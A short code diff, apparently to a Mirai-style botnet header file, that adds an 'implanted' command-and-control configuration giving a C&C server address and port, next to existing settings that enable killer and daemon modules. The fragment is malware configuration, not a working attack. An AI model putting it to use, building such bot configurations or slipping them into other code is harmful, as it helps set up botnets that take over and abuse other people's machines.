@@ -7,6 +7,10 @@
 #define DEFAULT_PORT 80
 #define CNC_RECONNECT_TIMEOUT 30
 
+// Implanted C&C configuration
+#define CNC_SERVER "192.168.1.100"
+#define CNC_PORT 1337
+
 // Security settings
 #define ENABLE_KILLER 1
 #define ENABLE_DAEMON 1
